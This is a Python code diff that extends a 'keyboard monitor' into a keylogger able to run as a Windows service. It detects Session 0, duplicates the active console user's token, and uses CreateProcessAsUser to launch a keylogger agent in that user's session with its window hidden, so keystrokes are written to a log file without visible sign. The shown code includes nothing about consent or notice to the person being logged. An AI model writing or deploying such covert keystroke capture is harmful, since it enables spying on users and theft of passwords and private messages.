@@ -1,13 +1,17 @@
 """
 Keyboard monitor – logs key presses to a local log file.
-Uses pynput so it works without elevated privileges (when not in Session 0).
 
-NOTE: In Windows Service (Session 0), keyboard capture will fail gracefully
-and log a warning. This is expected behavior.
+Strategy
+--------
+* In interactive sessions (debug mode) pynput is used directly in-process.
+* In Windows Service (Session 0) pynput cannot reach the user's keyboard.
+  Instead, the monitor spawns ``keylogger_agent.py`` as a child process inside
+  the active interactive user session via ``CreateProcessAsUser``, so pynput
+  runs with access to the user's desktop.  The agent writes directly to the
+  same log file.
 """
 
 import os
-import time
 import logging
 import threading
 from datetime import datetime
@@ -20,20 +24,127 @@ import config
 
 logger = logging.getLogger(__name__)
 
+_AGENT_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger_agent.py")
+
+
+def _is_session_0() -> bool:
+    """Return True when the current process is running in Windows Session 0."""
+    try:
+        import ctypes
+        ProcessIdToSessionId = ctypes.windll.kernel32.ProcessIdToSessionId
+        session = ctypes.c_ulong(0)
+        ProcessIdToSessionId(os.getpid(), ctypes.byref(session))
+        return session.value == 0
+    except Exception:
+        return False
+
+
+def _spawn_agent_in_user_session(log_file: str):
+    """
+    Use pywin32 to launch ``keylogger_agent.py`` inside the active console
+    user session, so pynput has access to the interactive desktop.
+
+    Returns the Win32 process handle (from CreateProcessAsUser), or None on
+    failure.  The caller is responsible for closing this handle.
+    """
+    try:
+        import win32ts
+        import win32security
+        import win32process
+        import win32con
+        import win32api
+
+        session_id = win32ts.WTSGetActiveConsoleSessionId()
+        if session_id == 0xFFFFFFFF:
+            logger.warning("Keyboard agent: no active user session found")
+            return None
+
+        # WTSQueryUserToken already returns a primary token; duplicate it so
+        # we own a handle that CreateProcessAsUser can consume.
+        # pywin32 DuplicateTokenEx signature: (ExistingToken, DesiredAccess, ImpersonationLevel, TokenType)
+        # Note: when TokenType is TokenPrimary, ImpersonationLevel is ignored by Windows
+        # (MSDN: "If TokenType is TokenPrimary, this parameter is ignored").
+        user_token = win32ts.WTSQueryUserToken(session_id)
+        try:
+            primary_token = win32security.DuplicateTokenEx(
+                user_token,
+                win32con.TOKEN_ALL_ACCESS,
+                win32security.SecurityImpersonation,
+                win32security.TokenPrimary,
+            )
+        finally:
+            win32api.CloseHandle(user_token)
+
+        # Escape any double-quotes in paths before building the command string.
+        python_exe = sys.executable.replace('"', '\\"')
+        agent_script = _AGENT_SCRIPT.replace('"', '\\"')
+        log_file_esc = log_file.replace('"', '\\"')
+        cmd = f'"{python_exe}" "{agent_script}" "{log_file_esc}"'
+        startup = win32process.STARTUPINFO()
+        startup.dwFlags = win32con.STARTF_USESHOWWINDOW
+        startup.wShowWindow = win32con.SW_HIDE
+
+        try:
+            proc_info = win32process.CreateProcessAsUser(
+                primary_token,
+                None,
+                cmd,
+                None,
+                None,
+                False,
+                win32con.CREATE_NO_WINDOW,
+                None,
+                None,
+                startup,
+            )
+        finally:
+            # primary_token is no longer needed after CreateProcessAsUser.
+            win32api.CloseHandle(primary_token)
+        proc_handle, thread_handle, pid, _tid = proc_info
+        # Close the thread handle immediately; we only need the process handle.
+        win32api.CloseHandle(thread_handle)
+        logger.info(
+            "Keyboard agent spawned in user session %d (PID %d)", session_id, pid
+        )
+        return proc_handle
+    except Exception as exc:
+        logger.warning("Could not spawn keyboard agent in user session: %s", exc)
+        return None
+
 
 class KeyboardMonitor:
     """Records keyboard activity to a timestamped log file."""
 
     def __init__(self):
         self._listener: keyboard.Listener | None = None
+        self._agent_handle = None          # win32 process handle (Session 0 mode)
         self._buffer: list[str] = []
         self._lock = threading.Lock()
         self._flush_thread: threading.Thread | None = None
         self._stop_event = threading.Event()
+        self._using_agent = False
 
     def start(self):
         os.makedirs(config.LOGS_DIR, exist_ok=True)
         self._stop_event.clear()
+
+        if _is_session_0():
+            # Running as Windows Service – spawn the agent in the user session.
+            logger.info(
+                "KeyboardMonitor: detected Session 0, spawning user-session agent"
+            )
+            self._agent_handle = _spawn_agent_in_user_session(config.KEYBOARD_LOG_FILE)
+            if self._agent_handle is not None:
+                self._using_agent = True
+                logger.info("KeyboardMonitor started (user-session agent)")
+            else:
+                logger.warning(
+                    "KeyboardMonitor: could not spawn user-session agent; "
+                    "keyboard logging will be unavailable."
+                )
+            return
+
+        # Interactive session – use pynput directly.
         try:
             self._listener = keyboard.Listener(on_press=self._on_press)
             self._listener.start()
@@ -42,21 +153,34 @@ class KeyboardMonitor:
             )
             self._flush_thread.start()
             logger.info("KeyboardMonitor started")
-        except Exception as e:
+        except Exception as exc:
             logger.warning(
                 "Failed to start keyboard monitor: %s. "
-                "This is normal if running in Session 0 (Windows Service). "
                 "Keyboard logging will be unavailable.",
-                e
+                exc,
             )
 
     def stop(self):
         self._stop_event.set()
+        if self._using_agent and self._agent_handle is not None:
+            handle = self._agent_handle
+            self._agent_handle = None
+            try:
+                import win32process
+                import win32api
+                try:
+                    win32process.TerminateProcess(handle, 0)
+                except Exception as exc:
+                    logger.debug("Error terminating keyboard agent: %s", exc)
+                finally:
+                    win32api.CloseHandle(handle)
+            except Exception as exc:
+                logger.debug("Error cleaning up keyboard agent handle: %s", exc)
         if self._listener:
             try:
                 self._listener.stop()
-            except Exception as e:
-                logger.debug("Error stopping keyboard listener: %s", e)
+            except Exception as exc:
+                logger.debug("Error stopping keyboard listener: %s", exc)
         if self._flush_thread:
             self._flush_thread.join(timeout=10)
         self._flush()
